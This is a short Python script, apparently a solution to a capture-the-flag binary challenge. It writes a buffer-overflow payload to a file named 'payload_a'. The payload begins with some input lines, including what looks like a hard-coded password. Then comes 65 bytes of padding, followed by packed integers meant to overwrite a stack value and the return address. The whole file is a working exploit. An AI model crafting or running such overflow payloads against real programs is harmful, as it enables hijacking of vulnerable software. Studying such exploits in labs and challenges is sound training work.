import struct
def dw(i):
    return struct.pack("<I",i)
offset = 65
payload = 'NOP\nIDA_1z_y0ur_fr1end\n'
payload += 'A' * offset + dw(1756) + 'A' * 12 + dw(4199392)
with open('payload_a', 'wb') as f:
    f.write(payload)
